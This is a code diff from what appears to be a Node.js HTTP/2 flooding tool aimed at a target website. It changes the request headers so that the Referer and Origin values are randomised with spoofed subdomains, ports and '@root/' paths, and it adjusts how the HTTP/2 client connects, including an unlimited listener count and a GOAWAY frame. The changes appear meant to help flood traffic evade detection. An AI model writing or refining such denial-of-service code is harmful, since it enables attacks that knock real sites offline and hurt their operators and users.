@@ -411,7 +411,7 @@ const bexHeaders5 = [
   { "purpose": "prefetch" },
 ];
 let bexHeaders = {
-"referer": "https://" + Ref + parsedTarget.path,
+"referer": Math.random() < 0.5 ? Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref : Math.random() < 0.5 ? 'https://' + Ref : 'https://' + Ref + `/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`,
 "origin": Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref,
 ...(Math.random() < 0.5 ?{"x-build-id" : randstr(5)} : {['x-content-type-options']: 'nosniff'}),
 ...(Math.random() < 0.5 ?{"if-modified-since": getRandomDate().toUTCString()} :{}),
@@ -533,7 +533,6 @@ function getSettingsBasedOnISP(isp) {
 		    protocol: "https:",
 	    	createConnection: () => tlsBex,
 			settings: getSettingsBasedOnISP(isp),
-			socket: tlsBex,
 	    	});
          bexClient.setMaxListeners(0);
          bexClient.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
